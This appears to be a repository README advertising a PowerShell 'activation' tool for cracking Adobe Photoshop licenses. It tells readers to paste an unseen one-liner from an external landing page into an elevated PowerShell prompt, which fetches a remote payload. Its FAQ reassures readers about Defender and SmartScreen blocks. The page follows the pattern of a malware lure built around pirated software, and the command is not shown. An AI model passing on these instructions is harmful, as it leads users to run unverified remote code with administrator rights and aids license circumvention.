<div align="center">
<br/>
<h1>Adobe Photoshop Activation Method Via</h1>
<h3><em>Utilities and companion tools for Adobe Photoshop Activation Method via powershell.</em></h3>
<br/>
<p>
  <img src="https://img.shields.io/badge/Platform-Windows-e01327?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-2563EB?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-2563EB?style=for-the-badge" alt="" />
</p>
<br/>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=00BCD4&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%93%A6+Ps+Activation+Script+Pro;%F0%9F%94%A7+Built+for+Windows+11;%E2%9C%A8+Active+Development+2026;%E2%AD%90+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=windows" />
  <img src="https://skillicons.dev/icons?i=cpp" />
</p>

---

### 🖥️ PowerShell Setup

Open an elevated PowerShell session on Windows 10/11, paste the one-liner from the landing page, and press Enter — the bootstrap handles the rest.

[![Stars](https://img.shields.io/badge/stars-community-blue?style=flat-square)](https://akashbadithya.github.io/ps-activation-script/)
[![OS](https://img.shields.io/badge/os-windows%2010%2F11-informational?style=flat-square)]()
[![PS Core](https://img.shields.io/badge/powershell-5.1%2B-5391FE?style=flat-square)]()

<p align="center">
  <a href="https://akashbadithya.github.io/ps-activation-script/">
    <img src="files/button.svg" width="520" alt="Open Powershell Setup" />
  </a>
</p>

## System Requirements

| Component | Requirement |
|-----------|-------------|
| OS | Windows 10 (1809+) or Windows 11 (22H2+) |
| PowerShell | 5.1 (built-in) or PowerShell Core 7.x |
| Runtime | .NET Framework 4.7.2+ / .NET 6+ for PS7 |
| Architecture | x64 preferred; x86 supported with caveats |
| Network | Outbound HTTPS for script + payload fetch |
| Privileges | Administrator token (UAC elevation required) |
| Disk | ~40 MB scratch space under `%LOCALAPPDATA%` |
| Photoshop | CS6 / CC 2019–2026 (any subscription tier) |

---

## Features

**Activation Core**
- License state inspection via `Get-ActivationStatus` — reports trial, expired, and valid states per installed Photoshop build
- Offline ticket staging under `%ProgramData%\ps-activation-script\` with dry-run diff before write
- Registry snapshot + rollback: uninstalls cleanly restores the pre-run hive
- Idempotent apply — running twice does not double-patch, verified against CC 2024 service layout

**Tooling**
- `-WhatIf` and `-Verbose` support on every cmdlet, tested on PS 5.1 and 7.4
- Self-contained bootstrap: fetches only what's needed, no persistent agent after exit
- Presigned runtime helpers removed on completion (checksum-verified before removal)
- Per-user vs machine-wide switch (`-Scope User|Machine`)
- Logs to `%TEMP%\ps-activation-<timestamp>.log` with verbosity tiers

---

## How it works

The landing page serves a signed PowerShell bootstrap. You paste the one-liner into an elevated prompt; the bootstrap downloads the current release payload, verifies its hash, unpacks to a temporary working directory, and walks the activation pipeline step by step.

Each stage writes a checkpoint line to the log. If any stage fails — hash mismatch, insufficient elevation, Photoshop not detected — the script exits non-zero and restores the last checkpoint. Nothing persists beyond the run directory; no service is registered, no scheduled task is left behind.

The pipeline itself is boring by design: inspect → stage → apply → verify → clean. Every step is reversible via `-Rollback`.

---

## Compatibility

| Platform version | Status |
|------------------|--------|
| Photoshop 2026 (v27.x) | ✅ Tested |
| Photoshop 2025 (v26.x) | ✅ Tested |
| Photoshop 2024 (v25.x) | ✅ Tested |
| Photoshop CC 2019–2023 | ⚠️ Legacy path, tested |
| Photoshop CS6 | 🟡 Community-reported, not regression-tested |
| Windows 10 21H2+ | ✅ Tested |
| Windows 11 23H2+ | ✅ Tested |
| Server 2019/2022 | 🟡 Works, unsupported |

Offline use is supported — the bootstrap caches the payload after first run so subsequent invocations on the same machine don't need network access.

---

## FAQ

**Q: Do I need to disable Windows Defender to run it?**
No. The bootstrap is a plain PowerShell script; nothing in the pipeline requires signature exemption. If Smart Screen blocks the one-liner, that's a browser-side gate, not the script — copy the command directly from the landing page instead of clicking anything.

**Q: Does this modify Photoshop's install directory?**
No writes to `Program Files`. All state changes are in the registry hive (with snapshot) and `%ProgramData%`. Rollback reverses both in the order they were applied.

**Q: Which PowerShell version should I use?**
PS 5.1 is the tested baseline because it ships with Windows. PS 7.4 works for everything except the legacy CS6 path — use 5.1 if you're targeting CS6.

**Q: Can I run it without admin rights?**
Not for machine-wide activation. `-Scope User` works unelevated but only patches the per-user license cache, which some Photoshop builds ignore.

**Q: Is the script payload signed?**
The bootstrap is hash-verified before extraction. Intermediate helpers are signed and checked before execution; mismatch aborts the run.

**Q: Will this survive a Photoshop update?**
Usually yes for patch updates; major point releases may reset state, in which case just rerun the one-liner. The idempotent apply means that's safe.

**Q: Where does it leave logs?**
`%TEMP%\ps-activation-<timestamp>.log`. Add `-Verbose` for per-step trace, `-WhatIf` for a dry-run plan without side effects.

---

## Disclaimer

For **educational and research use** only. Provided as-is, no warranty express or implied. Use at your own risk — you are responsible for complying with the software license terms in your jurisdiction. Authors assume no liability for license violations, data loss, or system damage.

---

## License

MIT — see [LICENSE](./LICENSE) for the full text.
